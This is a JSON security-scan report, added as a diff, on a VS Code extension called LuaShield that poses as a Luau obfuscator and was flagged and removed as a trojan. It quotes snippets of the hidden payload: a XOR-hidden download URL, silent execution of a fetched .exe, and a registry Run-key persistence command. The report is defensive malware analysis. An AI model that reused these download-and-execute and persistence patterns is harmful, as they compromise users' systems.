@@ -1,0 +1,164 @@
+{
+  "extension_id": "LuaShield.lua-shield",
+  "display_name": "LuaShield: Luau Obfuscator & Asset Protection",
+  "version": "1.0.4",
+  "publisher": {
+    "name": "LuaShield",
+    "verified": false
+  },
+  "vsix_sha256": "7b4edb8e90c8f8142a4df330d7fa6350972a361c0c41f35d17aab4c111800f3b",
+  "verdict": "HIGH-RISK",
+  "confirmation_basis": [
+    "composite_score",
+    "marketplace_removal"
+  ],
+  "confidence": 1.0,
+  "scores": {
+    "composite": 0.8312499999999999,
+    "ai_vibe": 1.0,
+    "static": 0.375,
+    "behavioral": 0.95,
+    "trust_signal": 1.0,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [],
+    "high": [
+      {
+        "check": "ACTIVATION_WILDCARD",
+        "severity": "HIGH",
+        "description": "Extension uses wildcard activation: ['*']",
+        "file": "package.json",
+        "line": null,
+        "snippet": null
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/extension.js",
+        "line": 9,
+        "snippet": "const { exec } = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require('child_process')' pattern",
+        "file": "extension/extension.js",
+        "line": 9,
+        "snippet": "const { exec } = require('child_process');"
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/extension.js",
+        "line": 9,
+        "snippet": "require('child_process')"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Registry modification command",
+        "file": "extension/extension.js",
+        "line": 42,
+        "snippet": "reg add"
+      }
+    ],
+    "total": 8
+  },
+  "extracted_references": [
+    {
+      "type": "domain",
+      "value": "wearedevs.net",
+      "source_file": "extension/extension.js",
+      "line": 153,
+      "context": "hostname: 'wearedevs.net',",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    }
+  ],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 0,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "MALICIOUS",
+    "risk_score": 1.0,
+    "confidence": 1.0,
+    "blocks_parsed": 1,
+    "blocks_seen": 1,
+    "summaries": [
+      {
+        "target": "extension/extension.js",
+        "summary": "This extension is a malicious trojan disguised as a Lua obfuscator. While it contains legitimate-looking code for obfuscating Lua scripts via an API, it also contains a hidden payload that downloads and executes a remote executable ('Project_AiDs_ingame.exe') from a decrypted URL. The payload establishes persistence by modifying the Windows registry and executes the binary silently. This is a clear supply-chain attack designed to compromise user systems."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension claims to be a Lua obfuscator but contains a hidden payload execution routine that downloads and runs an executable file, completely unrelated to its stated purpose.",
+        "code_reference": "const payload = Buffer.from([...]); ... const exeName = \"Project_AiDs_ingame.exe\";",
+        "line_hint": "33",
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "C2_AND_TUNNELING",
+        "description": "The code uses XOR decryption to hide a URL, then downloads a remote executable from that URL to the temporary directory.",
+        "code_reference": "const url = decrypt(payload, key).toString('utf8'); ... https.get(url, (res) => { res.pipe(file); ...",
+        "line_hint": "40",
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "PERSISTENCE_MECHANISM",
+        "description": "The code attempts to create a registry run key to ensure the downloaded executable runs at startup, establishing persistence on the victim's machine.",
+        "code_reference": "const regCmd = `reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Project_AiDs /t REG_SZ /d \"${exePath}\" /f`;",
+        "line_hint": "52",
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "ARBITRARY_COMMAND_EXECUTION",
+        "description": "The code uses child_process.exec to run the downloaded executable silently and execute the registry modification command.",
+        "code_reference": "exec(regCmd, () => { const startCmd = `start \"\" \"${exePath}\"`; exec(startCmd, { windowsHide: true }); });",
+        "line_hint": "53",
+        "target": "extension/extension.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The extension activates on '*' (all events), which is unnecessary for a simple formatter/obfuscator and allows the malicious payload to execute immediately upon VS Code startup.",
+        "code_reference": "Activation Events: *",
+        "line_hint": null,
+        "target": "extension/extension.js"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "This extension is a malicious trojan disguised as a Lua obfuscator. While it contains legitimate-looking code for obfuscating Lua scripts via an API, it also contains a hidden payload that downloads and executes a remote executable ('Project_AiDs_ingame.exe') from a decrypted URL. The payload establishes persistence by modifying the Windows registry and executes the binary silently. This is a clear supply-chain attack designed to compromise user systems.",
+  "escalation_reasons": [],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 1,
+    "published_date": "2026-05-01T02:36:04.44Z",
+    "removed_by_microsoft": true,
+    "removal_type": "Malware"
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-17T03:01:04.923870+00:00Z"
+}
